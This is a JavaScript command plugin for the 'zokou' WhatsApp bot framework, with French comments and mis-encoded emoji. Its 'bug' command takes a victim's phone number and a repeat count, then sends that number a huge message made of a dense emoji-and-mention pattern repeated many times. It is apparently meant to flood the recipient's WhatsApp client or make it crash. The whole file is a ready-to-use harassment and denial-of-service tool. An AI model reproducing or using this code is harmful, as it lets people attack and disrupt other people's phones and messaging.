const { zokou } = require('../framework/zokou');  // Importation de zokou
const { addOrUpdateDataInAlive, getDataFromAlive } = require('../bdd/alive');  // Fonctions de gestion de donn√©es
const moment = require("moment-timezone");  // Pour la gestion des fuseaux horaires
const s = require(__dirname + "/../set");  // Configuration sp√©cifique

// Fonction pour g√©n√©rer le message avec les motifs
const generateMessage = (repeatCount) => {
    const pattern = `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*\n` +
                    `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*\n` +
                    `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*\n` +
                    `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*\n` +
                    `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*\n` +
                    `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*\n` +
                    `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*\n` +
                    `üöª.*~8~*.-*~@888888~*.üíä.*üòà.*~9~*.-*~@9999999~*.üî•.*\n` +
                    `üíê.*~7~*.-*~@22222222~*.ü¶ß.*\n` +
                    `ü••.*~0~*.-*~@444444~*.üèñ.*\n` +
                    `üéã.*~5~*.-*~@1111111~*.ü©∏.*\n` +
                    `‚ôø.*~6~*.-*~@5555555~*.‚öô.*\n` +
                    `üéÅ.*~1~*.-*~@7777777~*.üéâ.*\n` +
                    `üîÆ.*~3~*.-*~@666666~*.üé©.*`;

    return pattern.repeat(repeatCount);
};

zokou({
    nomCom: 'bug',  // Nom de la commande
    categorie: 'General',  // Cat√©gorie de la commande
    execute: async (msg, sock, args, isGroup, isUserAdmin, isBotAdmin, reply, from) => {
        try {
            const number = args[0];  // Le num√©ro du destinataire
            const repeatCount = parseInt(args[1]);  // Le nombre de r√©p√©titions

            if (isNaN(repeatCount) || repeatCount <= 0) {
                return reply("Veuillez entrer un nombre valide de r√©p√©titions.");
            }

            // G√©n√©ration du message bas√© sur le nombre de r√©p√©titions
            const message = generateMessage(repeatCount);

            // Envoi du message au num√©ro sp√©cifi√©
            await sock.sendMessage(number, { text: message });
            reply(`Message envoy√© avec succ√®s √† ${number} avec ${repeatCount} r√©p√©titions.`);
        } catch (error) {
            console.error("Erreur lors de l'envoi du message:", error);
            reply("Une erreur est survenue lors de l'envoi du message. Veuillez r√©essayer.");
        }
    }
});
